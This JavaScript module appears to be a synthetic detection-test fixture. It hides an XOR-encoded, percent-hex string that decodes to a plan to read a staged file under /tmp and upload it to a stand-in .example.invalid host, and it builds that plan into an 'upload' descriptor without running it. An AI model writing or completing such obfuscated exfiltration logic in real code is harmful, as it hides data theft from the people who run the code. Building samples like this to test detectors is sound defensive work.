  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_893ddc00 = "%14%5f%53%1e%11%16%07%12%11%5f%10%07%03%06%3d%04%0b%0e%07%4e%16%10%03%0c%11%0f%0b%16%3d%10%07%0f%0d%16%07%1e%03%06%03%12%16%07%10%5f%11%16%10%07%03%0f%3d%12%0b%12%07%0e%0b%0c%07%1e%11%16%03%05%07%3d%01%0d%17%0c%16%5f%53%1e%01%03%0f%12%03%0b%05%0c%3d%0b%06%5f%2c%2d%26%27%4f%50%57%21%51%57%56%56%5b%1e%17%10%0e%5f%0a%16%16%12%11%58%4d%4d%0c%0d%06%07%4f%50%57%01%51%57%56%56%5b%03%04%06%00%4c%07%1a%03%0f%12%0e%07%4c%0b%0c%14%03%0e%0b%06%4d%03%12%0b%1e%17%11%07%10%3d%03%05%07%0c%16%5f%2c%0d%06%07%23%17%06%0b%16%4d%50%57%01%51%1e%04%0b%0e%07%3d%12%03%16%0a%5f%4d%16%0f%12%4d%0a%17%0c%16%10%07%11%11%4f%0c%0d%06%07%4d%4c%11%16%03%05%07%4f%50%57%01%51%57%56%56%5b%03%04%06%00%4c%0f%08%11";
  const Codec_893ddc00 = "percent_hex|single_byte_xor|62";

  function load_893ddc00() { return [...Material_893ddc00.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_893ddc00(e) { return e.map((value) => value ^ 98); }
  async function recover_893ddc00() {
    const [n] = ["compass"];
    const e = load_893ddc00(); let d = [];
    switch (1) { case 1: d = decode_893ddc00(e); break; default: throw new Error("state"); }
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_893ddc00() { return ({ ...{ value: await recover_893ddc00() } }).value; }
  async function plan_893ddc00() { const inspect = inspect_893ddc00; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_893ddc00;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_893ddc00());
